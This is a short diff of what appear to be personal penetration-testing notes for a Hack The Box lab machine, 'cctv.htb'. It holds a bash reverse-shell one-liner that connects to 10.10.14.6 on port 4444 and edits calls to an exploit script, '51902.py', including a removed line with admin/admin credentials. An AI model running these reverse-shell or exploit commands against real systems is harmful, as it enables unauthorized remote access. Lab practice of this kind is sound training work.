@@ -1,8 +1,8 @@
 # IPMI – Intelligent Platform Management Interface
 bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'
-python3 51902.py --target http://cctv.htb --username admin --password admin --lhost 10.10.14.2 --lport 4444
 
-python3 51902.py -t http://cctv.htb -ip 10.10.14.2 -p 4444
+python3 51902.py -t http://cctv.htb/zm -ip 10.10.14.2 -p 4444
+
 
 
 
